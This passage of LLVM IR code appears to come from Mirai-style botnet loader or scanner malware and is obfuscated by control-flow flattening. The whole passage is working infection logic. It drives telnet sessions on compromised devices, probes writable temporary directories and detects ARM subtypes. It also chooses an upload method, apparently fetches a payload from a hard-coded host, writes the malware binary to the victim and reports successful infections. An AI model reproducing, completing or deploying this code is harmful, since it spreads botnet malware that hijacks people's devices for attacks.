; <label>:820:                                    ; preds = %loopEntry
  %821 = load i32, i32* %35, align 4
  %822 = icmp eq i32 %821, -1
  %823 = select i1 %822, i32 1884879488, i32 260343989
  store i32 %823, i32* %switchVar
  br label %loopEnd

; <label>:824:                                    ; preds = %loopEntry
  %825 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %826 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %825, i32 0, i32 2
  %827 = load i32, i32* %826, align 8
  %828 = call i32 @close(i32 %827)
  %829 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %830 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %829, i32 0, i32 2
  store i32 -1, i32* %830, align 8
  %831 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %832 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %831, i32 0, i32 9
  %833 = load i8, i8* %832, align 4
  %834 = add i8 %833, 1
  store i8 %834, i8* %832, align 4
  %835 = zext i8 %834 to i32
  %836 = icmp eq i32 %835, 10
  %837 = select i1 %836, i32 1959187159, i32 2118293092
  store i32 %837, i32* %switchVar
  br label %loopEnd

; <label>:838:                                    ; preds = %loopEntry
  %839 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %839, i32 1)
  store i32 -1389888091, i32* %switchVar
  br label %loopEnd

; <label>:840:                                    ; preds = %loopEntry
  %841 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @setup_connection(%struct.scanner_connection* %841)
  store i32 -1389888091, i32* %switchVar
  br label %loopEnd

; <label>:842:                                    ; preds = %loopEntry
  store i32 260343989, i32* %switchVar
  br label %loopEnd

; <label>:843:                                    ; preds = %loopEntry
  store i32 1128262868, i32* %switchVar
  br label %loopEnd

; <label>:844:                                    ; preds = %loopEntry
  store i32 -1387315422, i32* %switchVar
  br label %loopEnd

; <label>:845:                                    ; preds = %loopEntry
  %846 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %847 = call i32 @consume_resp_prompt(%struct.scanner_connection* %846)
  store i32 %847, i32* %35, align 4
  %848 = icmp sgt i32 %847, 0
  %849 = select i1 %848, i32 606253401, i32 1777428236
  store i32 %849, i32* %switchVar
  br label %loopEnd

; <label>:850:                                    ; preds = %loopEntry
  %851 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %852 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %851, i32 0, i32 5
  store i32 0, i32* %852, align 4
  %853 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %854 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %853, i32 0, i32 1
  %855 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %854, i32 0, i32 0
  %856 = load i32, i32* %855, align 8
  %857 = icmp ne i32 %856, 0
  %858 = select i1 %857, i32 513270282, i32 -1044220026
  store i32 %858, i32* %switchVar
  br label %loopEnd

; <label>:859:                                    ; preds = %loopEntry
  %860 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %861 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %860, i32 0, i32 2
  %862 = load i32, i32* %861, align 8
  %863 = call i32 (i32, i8*, ...) @fdsend(i32 %862, i8* getelementptr inbounds ([141 x i8], [141 x i8]* @.str.107, i32 0, i32 0))
  %864 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %865 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %864, i32 0, i32 16
  store i32 7, i32* %865, align 8
  store i32 352497791, i32* %switchVar
  br label %loopEnd

; <label>:866:                                    ; preds = %loopEntry
  %867 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %868 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %867, i32 0, i32 8
  %869 = getelementptr inbounds [16 x i8], [16 x i8]* %868, i32 0, i32 0
  %870 = call i32 @strcmp(i8* %869, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.108, i32 0, i32 0)) #10
  %871 = icmp ne i32 %870, 0
  %872 = select i1 %871, i32 1693142340, i32 719685126
  store i32 %872, i32* %switchVar
  br label %loopEnd

; <label>:873:                                    ; preds = %loopEntry
  %874 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %875 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %874, i32 0, i32 8
  %876 = getelementptr inbounds [16 x i8], [16 x i8]* %875, i32 0, i32 0
  %877 = call i32 @strcmp(i8* %876, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.109, i32 0, i32 0)) #10
  %878 = icmp ne i32 %877, 0
  %879 = select i1 %878, i32 -1651685129, i32 719685126
  store i32 %879, i32* %switchVar
  br label %loopEnd

; <label>:880:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 11)
  %881 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %882 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %881, i32 0, i32 2
  %883 = load i32, i32* %882, align 8
  %884 = call i8* @table_retrieve_val(i32 11, i32* null)
  %885 = call i32 (i32, i8*, ...) @fdsend(i32 %883, i8* getelementptr inbounds ([142 x i8], [142 x i8]* @.str.110, i32 0, i32 0), i8* %884)
  call void @table_lock_val(i8 zeroext 11)
  %886 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %887 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %886, i32 0, i32 16
  store i32 8, i32* %887, align 8
  store i32 -1387315422, i32* %switchVar
  br label %loopEnd

; <label>:888:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 11)
  %889 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %890 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %889, i32 0, i32 2
  %891 = load i32, i32* %890, align 8
  %892 = call i8* @table_retrieve_val(i32 11, i32* null)
  %893 = call i32 (i32, i8*, ...) @fdsend(i32 %891, i8* %892)
  call void @table_lock_val(i8 zeroext 11)
  %894 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %895 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %894, i32 0, i32 16
  store i32 9, i32* %895, align 8
  store i32 352497791, i32* %switchVar
  br label %loopEnd

; <label>:896:                                    ; preds = %loopEntry
  store i32 1777428236, i32* %switchVar
  br label %loopEnd

; <label>:897:                                    ; preds = %loopEntry
  store i32 -1387315422, i32* %switchVar
  br label %loopEnd

; <label>:898:                                    ; preds = %loopEntry
  %899 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %900 = call i32 @parse_elf_response(%struct.scanner_connection* %899)
  store i32 %900, i32* %35, align 4
  %901 = icmp sgt i32 %900, 0
  %902 = select i1 %901, i32 1740353394, i32 -1680263468
  store i32 %902, i32* %switchVar
  br label %loopEnd

; <label>:903:                                    ; preds = %loopEntry
  %904 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %905 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %904, i32 0, i32 1
  %906 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %905, i32 0, i32 0
  store i32 1, i32* %906, align 8
  %907 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @setup_connection(%struct.scanner_connection* %907)
  store i32 892197298, i32* %switchVar
  br label %loopEnd

; <label>:908:                                    ; preds = %loopEntry
  %909 = load i32, i32* %35, align 4
  %910 = icmp eq i32 %909, -1
  %911 = select i1 %910, i32 683775433, i32 1001305010
  store i32 %911, i32* %switchVar
  br label %loopEnd

; <label>:912:                                    ; preds = %loopEntry
  %913 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %914 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %913, i32 0, i32 9
  store i8 0, i8* %914, align 4
  %915 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %915, i32 1)
  store i32 1001305010, i32* %switchVar
  br label %loopEnd

; <label>:916:                                    ; preds = %loopEntry
  store i32 892197298, i32* %switchVar
  br label %loopEnd

; <label>:917:                                    ; preds = %loopEntry
  store i32 -1387315422, i32* %switchVar
  br label %loopEnd

; <label>:918:                                    ; preds = %loopEntry
  %919 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %920 = call i32 @consume_arm_subtype(%struct.scanner_connection* %919)
  store i32 %920, i32* %35, align 4
  %921 = icmp sgt i32 %920, 0
  %922 = select i1 %921, i32 -640463071, i32 -2030312686
  store i32 %922, i32* %switchVar
  br label %loopEnd

; <label>:923:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 11)
  %924 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %925 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %924, i32 0, i32 2
  %926 = load i32, i32* %925, align 8
  %927 = call i8* @table_retrieve_val(i32 11, i32* null)
  %928 = call i32 (i32, i8*, ...) @fdsend(i32 %926, i8* %927)
  call void @table_lock_val(i8 zeroext 11)
  %929 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %930 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %929, i32 0, i32 16
  store i32 9, i32* %930, align 8
  store i32 -2030312686, i32* %switchVar
  br label %loopEnd

; <label>:931:                                    ; preds = %loopEntry
  store i32 -1387315422, i32* %switchVar
  br label %loopEnd

; <label>:932:                                    ; preds = %loopEntry
  %933 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %934 = call i32 @consume_resp_prompt(%struct.scanner_connection* %933)
  store i32 %934, i32* %35, align 4
  %935 = icmp sgt i32 %934, 0
  %936 = select i1 %935, i32 -1071325935, i32 -965191647
  store i32 %936, i32* %switchVar
  br label %loopEnd

; <label>:937:                                    ; preds = %loopEntry
  %938 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %939 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %938, i32 0, i32 15
  %940 = load i32, i32* %939, align 4
  %941 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %942 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %941, i32 0, i32 13
  %943 = load i16, i16* %942, align 8
  %944 = zext i16 %943 to i32
  %945 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @report_working(i32 %940, i32 %944, %struct.scanner_connection* %945, i32 0)
  store i32 0, i32* %36, align 4
  store i32 1046469753, i32* %switchVar
  br label %loopEnd

; <label>:946:                                    ; preds = %loopEntry
  %947 = load i32, i32* %36, align 4
  %948 = icmp slt i32 %947, 15
  %949 = select i1 %948, i32 76159825, i32 1025402981
  store i32 %949, i32* %switchVar
  br label %loopEnd

; <label>:950:                                    ; preds = %loopEntry
  %951 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %952 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %951, i32 0, i32 2
  %953 = load i32, i32* %952, align 8
  %954 = load i32, i32* %36, align 4
  %955 = sext i32 %954 to i64
  %956 = getelementptr inbounds [15 x i8*], [15 x i8*]* @tmp_dirs, i64 0, i64 %955
  %957 = load i8*, i8** %956, align 8
  %958 = load i32, i32* %36, align 4
  %959 = sext i32 %958 to i64
  %960 = getelementptr inbounds [15 x i8*], [15 x i8*]* @tmp_dirs, i64 0, i64 %959
  %961 = load i8*, i8** %960, align 8
  %962 = call i32 (i32, i8*, ...) @fdsend(i32 %953, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.111, i32 0, i32 0), i8* %957, i8* %961)
  store i32 1996714400, i32* %switchVar
  br label %loopEnd

; <label>:963:                                    ; preds = %loopEntry
  %964 = load i32, i32* %36, align 4
  %965 = add nsw i32 %964, 1
  store i32 %965, i32* %36, align 4
  store i32 1046469753, i32* %switchVar
  br label %loopEnd

; <label>:966:                                    ; preds = %loopEntry
  %967 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %968 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %967, i32 0, i32 2
  %969 = load i32, i32* %968, align 8
  %970 = call i32 (i32, i8*, ...) @fdsend(i32 %969, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.112, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.113, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.114, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 11)
  %971 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %972 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %971, i32 0, i32 2
  %973 = load i32, i32* %972, align 8
  %974 = call i8* @table_retrieve_val(i32 11, i32* null)
  %975 = call i32 (i32, i8*, ...) @fdsend(i32 %973, i8* getelementptr inbounds ([98 x i8], [98 x i8]* @.str.115, i32 0, i32 0), i8* %974)
  call void @table_lock_val(i8 zeroext 11)
  %976 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %977 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %976, i32 0, i32 16
  store i32 10, i32* %977, align 8
  store i32 -965191647, i32* %switchVar
  br label %loopEnd

; <label>:978:                                    ; preds = %loopEntry
  store i32 -1387315422, i32* %switchVar
  br label %loopEnd

; <label>:979:                                    ; preds = %loopEntry
  %980 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %981 = call i32 @consume_resp_prompt(%struct.scanner_connection* %980)
  store i32 %981, i32* %35, align 4
  %982 = icmp sgt i32 %981, 0
  %983 = select i1 %982, i32 -1876128669, i32 1676875259
  store i32 %983, i32* %switchVar
  br label %loopEnd

; <label>:984:                                    ; preds = %loopEntry
  %985 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %986 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %985, i32 0, i32 8
  %987 = getelementptr inbounds [16 x i8], [16 x i8]* %986, i32 0, i32 0
  %988 = call i32 @strcmp(i8* %987, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.116, i32 0, i32 0)) #10
  %989 = icmp eq i32 %988, 0
  %990 = select i1 %989, i32 191989630, i32 1147852198
  store i32 %990, i32* %switchVar
  br label %loopEnd

; <label>:991:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 11)
  %992 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %993 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %992, i32 0, i32 2
  %994 = load i32, i32* %993, align 8
  %995 = call i8* @table_retrieve_val(i32 11, i32* null)
  %996 = call i32 (i32, i8*, ...) @fdsend(i32 %994, i8* getelementptr inbounds ([142 x i8], [142 x i8]* @.str.117, i32 0, i32 0), i32 176, i32 107, i32 133, i32 208, i32 176, i32 107, i32 133, i32 208, i8* %995)
  call void @table_lock_val(i8 zeroext 11)
  %997 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %998 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %997, i32 0, i32 1
  %999 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %998, i32 0, i32 1
  store i32 3, i32* %999, align 4
  %1000 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1001 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1000, i32 0, i32 16
  store i32 13, i32* %1001, align 8
  store i32 -1387315422, i32* %switchVar
  br label %loopEnd

; <label>:1002:                                   ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 11)
  %1003 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1004 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1003, i32 0, i32 2
  %1005 = load i32, i32* %1004, align 8
  %1006 = call i8* @table_retrieve_val(i32 11, i32* null)
  %1007 = call i32 (i32, i8*, ...) @fdsend(i32 %1005, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.118, i32 0, i32 0), i8* %1006)
  call void @table_lock_val(i8 zeroext 11)
  %1008 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1009 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1008, i32 0, i32 16
  store i32 12, i32* %1009, align 8
  store i32 1676875259, i32* %switchVar
  br label %loopEnd

; <label>:1010:                                   ; preds = %loopEntry
  store i32 -1387315422, i32* %switchVar
  br label %loopEnd

; <label>:1011:                                   ; preds = %loopEntry
  %1012 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1013 = call i32 @connection_consume_upload_methods(%struct.scanner_connection* %1012)
  store i32 %1013, i32* %35, align 4
  %1014 = load i32, i32* %35, align 4
  %1015 = icmp ne i32 %1014, 0
  %1016 = select i1 %1015, i32 -2115844552, i32 463390574
  store i32 %1016, i32* %switchVar
  br label %loopEnd

; <label>:1017:                                   ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 11)
  %1018 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1019 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1018, i32 0, i32 1
  %1020 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %1019, i32 0, i32 1
  %1021 = load i32, i32* %1020, align 4
  store i32 %1021, i32* %.reg2mem47
  store i32 -51243306, i32* %switchVar
  br label %loopEnd

NodeBlock30:                                      ; preds = %loopEntry
  %.reload51 = load volatile i32, i32* %.reg2mem47
  %Pivot31 = icmp slt i32 %.reload51, 1
  %1022 = select i1 %Pivot31, i32 798213774, i32 579596024
  store i32 %1022, i32* %switchVar
  br label %loopEnd

NodeBlock28:                                      ; preds = %loopEntry
  %.reload49 = load volatile i32, i32* %.reg2mem47
  %Pivot29 = icmp slt i32 %.reload49, 2
  %1023 = select i1 %Pivot29, i32 -759427590, i32 -256306883
  store i32 %1023, i32* %switchVar
  br label %loopEnd

LeafBlock26:                                      ; preds = %loopEntry
  %.reload48 = load volatile i32, i32* %.reg2mem47
  %SwitchLeaf27 = icmp eq i32 %.reload48, 2
  %1024 = select i1 %SwitchLeaf27, i32 636641465, i32 -962879026
  store i32 %1024, i32* %switchVar
  br label %loopEnd

LeafBlock24:                                      ; preds = %loopEntry
  %.reload50 = load volatile i32, i32* %.reg2mem47
  %SwitchLeaf25 = icmp eq i32 %.reload50, 0
  %1025 = select i1 %SwitchLeaf25, i32 -910988379, i32 -962879026
  store i32 %1025, i32* %switchVar
  br label %loopEnd

; <label>:1026:                                   ; preds = %loopEntry
  %1027 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1028 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1027, i32 0, i32 2
  %1029 = load i32, i32* %1028, align 8
  %1030 = call i8* @table_retrieve_val(i32 11, i32* null)
  %1031 = call i32 (i32, i8*, ...) @fdsend(i32 %1029, i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.119, i32 0, i32 0), i8* %1030)
  store i32 -468098150, i32* %switchVar
  br label %loopEnd

; <label>:1032:                                   ; preds = %loopEntry
  %1033 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1034 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1033, i32 0, i32 2
  %1035 = load i32, i32* %1034, align 8
  %1036 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1037 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1036, i32 0, i32 8
  %1038 = getelementptr inbounds [16 x i8], [16 x i8]* %1037, i32 0, i32 0
  %1039 = call i8* @table_retrieve_val(i32 11, i32* null)
  %1040 = call i32 (i32, i8*, ...) @fdsend(i32 %1035, i8* getelementptr inbounds ([125 x i8], [125 x i8]* @.str.120, i32 0, i32 0), i32 176, i32 107, i32 133, i32 208, i8* %1038, i8* %1039)
  store i32 -468098150, i32* %switchVar
  br label %loopEnd

; <label>:1041:                                   ; preds = %loopEntry
  %1042 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1043 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1042, i32 0, i32 2
  %1044 = load i32, i32* %1043, align 8
  %1045 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1046 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1045, i32 0, i32 8
  %1047 = getelementptr inbounds [16 x i8], [16 x i8]* %1046, i32 0, i32 0
  %1048 = call i8* @table_retrieve_val(i32 11, i32* null)
  %1049 = call i32 (i32, i8*, ...) @fdsend(i32 %1044, i8* getelementptr inbounds ([121 x i8], [121 x i8]* @.str.121, i32 0, i32 0), i8* %1047, i32 176, i32 107, i32 133, i32 208, i8* %1048)
  store i32 -468098150, i32* %switchVar
  br label %loopEnd

NewDefault23:                                     ; preds = %loopEntry
  store i32 -468098150, i32* %switchVar
  br label %loopEnd

; <label>:1050:                                   ; preds = %loopEntry
  call void @table_lock_val(i8 zeroext 11)
  %1051 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1052 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1051, i32 0, i32 1
  %1053 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %1052, i32 0, i32 1
  %1054 = load i32, i32* %1053, align 4
  %1055 = icmp ne i32 %1054, 0
  %1056 = select i1 %1055, i32 1831035627, i32 -1355464850
  store i32 %1056, i32* %switchVar
  br label %loopEnd

; <label>:1057:                                   ; preds = %loopEntry
  %1058 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1059 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1058, i32 0, i32 16
  store i32 13, i32* %1059, align 8
  store i32 -160521494, i32* %switchVar
  br label %loopEnd

; <label>:1060:                                   ; preds = %loopEntry
  %1061 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1062 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1061, i32 0, i32 16
  store i32 11, i32* %1062, align 8
  store i32 -160521494, i32* %switchVar
  br label %loopEnd

; <label>:1063:                                   ; preds = %loopEntry
  store i32 463390574, i32* %switchVar
  br label %loopEnd

; <label>:1064:                                   ; preds = %loopEntry
  store i32 -1387315422, i32* %switchVar
  br label %loopEnd

; <label>:1065:                                   ; preds = %loopEntry
  %1066 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1067 = call i32 @consume_resp_prompt(%struct.scanner_connection* %1066)
  store i32 %1067, i32* %35, align 4
  %1068 = icmp sgt i32 %1067, 0
  %1069 = select i1 %1068, i32 1621741696, i32 2020295334
  store i32 %1069, i32* %switchVar
  br label %loopEnd

; <label>:1070:                                   ; preds = %loopEntry
  %1071 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1072 = call %struct.payload* @get_retrieve_binary(%struct.scanner_connection* %1071)
  store %struct.payload* %1072, %struct.payload** %6, align 8
  %1073 = load %struct.payload*, %struct.payload** %6, align 8
  %1074 = icmp ne %struct.payload* %1073, null
  %1075 = select i1 %1074, i32 -1572798613, i32 -987562603
  store i32 %1075, i32* %switchVar
  br label %loopEnd

; <label>:1076:                                   ; preds = %loopEntry
  %1077 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %1077, i32 1)
  store i32 -1387315422, i32* %switchVar
  br label %loopEnd

; <label>:1078:                                   ; preds = %loopEntry
  %1079 = load %struct.payload*, %struct.payload** %6, align 8
  %1080 = call %struct.binary* @process_retrieve_binary(%struct.payload* %1079)
  store %struct.binary* %1080, %struct.binary** %7, align 8
  %1081 = load %struct.binary*, %struct.binary** %7, align 8
  %1082 = icmp ne %struct.binary* %1081, null
  %1083 = select i1 %1082, i32 -1782885858, i32 10729810
  store i32 %1083, i32* %switchVar
  br label %loopEnd

; <label>:1084:                                   ; preds = %loopEntry
  %1085 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %1085, i32 1)
  store i32 -1387315422, i32* %switchVar
  br label %loopEnd

; <label>:1086:                                   ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 11)
  %1087 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1088 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1087, i32 0, i32 2
  %1089 = load i32, i32* %1088, align 8
  %1090 = load %struct.binary*, %struct.binary** %7, align 8
  %1091 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1092 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1091, i32 0, i32 12
  %1093 = load i8, i8* %1092, align 1
  %1094 = zext i8 %1093 to i64
  %1095 = getelementptr inbounds %struct.binary, %struct.binary* %1090, i64 %1094
  %1096 = getelementptr inbounds %struct.binary, %struct.binary* %1095, i32 0, i32 0
  %1097 = load i8*, i8** %1096, align 8
  %1098 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1099 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1098, i32 0, i32 12
  %1100 = load i8, i8* %1099, align 1
  %1101 = zext i8 %1100 to i32
  %1102 = icmp eq i32 %1101, 0
  %1103 = select i1 %1102, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.124, i32 0, i32 0)
  %1104 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1105 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1104, i32 0, i32 12
  %1106 = load i8, i8* %1105, align 1
  %1107 = zext i8 %1106 to i32
  %1108 = load %struct.binary*, %struct.binary** %7, align 8
  %1109 = getelementptr inbounds %struct.binary, %struct.binary* %1108, i32 0, i32 1
  %1110 = load i8, i8* %1109, align 8
  %1111 = zext i8 %1110 to i32
  %1112 = sub nsw i32 %1111, 1
  %1113 = icmp sge i32 %1107, %1112
  %1114 = select i1 %1113, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.126, i32 0, i32 0)
  %1115 = call i8* @table_retrieve_val(i32 11, i32* null)
  %1116 = call i32 (i32, i8*, ...) @fdsend(i32 %1089, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.122, i32 0, i32 0), i8* %1097, i8* %1103, i8* %1114, i8* %1115)
  call void @table_lock_val(i8 zeroext 11)
  %1117 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1118 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1117, i32 0, i32 12
  %1119 = load i8, i8* %1118, align 1
  %1120 = zext i8 %1119 to i32
  %1121 = load %struct.binary*, %struct.binary** %7, align 8
  %1122 = getelementptr inbounds %struct.binary, %struct.binary* %1121, i32 0, i32 1
  %1123 = load i8, i8* %1122, align 8
  %1124 = zext i8 %1123 to i32
  %1125 = icmp slt i32 %1120, %1124
  %1126 = select i1 %1125, i32 -506275454, i32 1486186392
  store i32 %1126, i32* %switchVar
  br label %loopEnd

; <label>:1127:                                   ; preds = %loopEntry
  %1128 = load %struct.binary*, %struct.binary** %7, align 8
  %1129 = bitcast %struct.binary* %1128 to i8*
  call void @free(i8* %1129) #7
  %1130 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1131 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1130, i32 0, i32 12
  %1132 = load i8, i8* %1131, align 1
  %1133 = add i8 %1132, 1
  store i8 %1133, i8* %1131, align 1
  %1134 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1135 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1134, i32 0, i32 16
  store i32 11, i32* %1135, align 8
  store i32 -1387315422, i32* %switchVar
  br label %loopEnd

; <label>:1136:                                   ; preds = %loopEntry
  %1137 = load %struct.binary*, %struct.binary** %7, align 8
  %1138 = bitcast %struct.binary* %1137 to i8*
  call void @free(i8* %1138) #7
  %1139 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1140 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1139, i32 0, i32 16
  store i32 13, i32* %1140, align 8
  store i32 2020295334, i32* %switchVar
  br label %loopEnd

; <label>:1141:                                   ; preds = %loopEntry
  store i32 -1387315422, i32* %switchVar
  br label %loopEnd

; <label>:1142:                                   ; preds = %loopEntry
  %1143 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1144 = call i32 @consume_method_resonse(%struct.scanner_connection* %1143)
  store i32 %1144, i32* %35, align 4
  %1145 = icmp sgt i32 %1144, 0
  %1146 = select i1 %1145, i32 -866596174, i32 -716857640
  store i32 %1146, i32* %switchVar
  br label %loopEnd

; <label>:1147:                                   ; preds = %loopEntry
  %1148 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1149 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1148, i32 0, i32 15
  %1150 = load i32, i32* %1149, align 4
  %1151 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %1152 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1151, i32 0, i32 13
  %1153 = load i16, i16* %1152, align 8
  %1154 = zext i16 %1153 to i32
  %1155 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @report_working(i32 %1150, i32 %1154, %struct.scanner_connection* %1155, i32 1)
  %1156 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  call void @fdclose(%struct.scanner_connection* %1156, i32 1)
  store i32 -457906068, i32* %switchVar
